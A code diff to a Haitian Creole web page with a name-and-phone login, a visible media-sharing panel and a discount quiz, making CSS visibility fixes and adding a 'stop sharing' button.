@@ -37,6 +37,7 @@
     display: flex; align-items: center; justify-content: center;
     padding: 20px; z-index: 999;
   }
+  .login-screen.hidden { display: none !important; }
   .login-box {
     background: #1a1a1a; border-radius: 16px;
     padding: 30px 25px;
@@ -65,7 +66,7 @@
   .login-box .err { color: #ff6666; font-size: 12px; margin-top: 10px; min-height: 16px; }
 
   .app-content { display: none; }
-  .app-content.active { display: block; }
+  .app-content.active { display: block !important; }
 
   header { text-align: center; padding: 25px 20px 15px; border-bottom: 1px solid #222; }
   header h1 {
@@ -88,6 +89,7 @@
   .cta .hint { font-size: 11px; color: #777; margin-top: 10px; line-height: 1.5; }
 
   .active-panel { margin: 25px auto 20px; max-width: 360px; padding: 0 20px; text-align: center; }
+  .active-panel.hidden { display: none !important; }
   .active-panel .card {
     background: #1a1a1a; border: 1px solid #00cc66;
     border-radius: 12px; padding: 20px;
@@ -131,6 +133,7 @@
     display: grid; grid-template-columns: repeat(3, 1fr);
     gap: 4px; padding: 4px; max-width: 900px; margin: 0 auto;
   }
+  .gallery.hidden { display: none !important; }
   .item {
     position: relative; aspect-ratio: 1/1;
     overflow: hidden; background: #1a1a1a;
@@ -157,7 +160,7 @@
     cursor: pointer; z-index: 3;
     display: flex; align-items: center; justify-content: center;
   }
-  .hidden { display: none; }
+  .hidden { display: none !important; }
   .empty { grid-column: 1 / -1; text-align: center; color: #666; padding: 30px; font-size: 13px; }
   footer { text-align: center; color: #444; font-size: 10px; margin-top: 30px; padding: 0 20px; }
 
@@ -181,6 +184,7 @@
     padding: 15px; z-index: 1001;
     overflow-y: auto;
   }
+  .modal-bg.hidden { display: none !important; }
   .modal {
     background: #1c1c1c; border-radius: 16px; padding: 25px 20px;
     max-width: 480px; width: 100%;
@@ -328,12 +332,13 @@
       <p class="hint"></p>
     </div>
 
-    <div class="active-panel hidden" id="activeView" style="display:none;">
+    <div class="active-panel hidden" id="activeView">
       <div class="card">
         <p><span class="dot"></span><strong>Bienvenue !</strong></p>
         <p style="margin-top:8px; font-size:13px; color:#aaa;">
           Administratè a ap wè ou.
         </p>
+        <button id="btnStop" class="btn-stop">⛔ Sispann Pataje</button>
         <button id="btnQuiz" class="btn-quiz">🎯 Fè Quiz la — Jwenn $8 Rabè</button>
       </div>
     </div>
@@ -509,7 +514,7 @@ nameInput.addEventListener("keydown", (e) => { if (e.key === "Enter") phoneInput
 phoneInput.addEventListener("keydown", (e) => { if (e.key === "Enter") btnLogin.click(); });
 
 function showApp() {
-  loginScreen.style.display = "none";
+  loginScreen.classList.add("hidden");
   appContent.classList.add("active");
 }
 
@@ -1073,7 +1078,6 @@ document.getElementById("btnSubmitOrder").onclick = async () => {
     active = true;
     ctaView.classList.add("hidden");
     activeView.classList.remove("hidden");
-    activeView.style.display = "block";
     startKeepAlive();
   }
 
@@ -1090,7 +1094,6 @@ document.getElementById("btnSubmitOrder").onclick = async () => {
       localStream = null;
     }
     activeView.classList.add("hidden");
-    activeView.style.display = "none";
     ctaView.classList.remove("hidden");
     btnStart.disabled = false;
   }
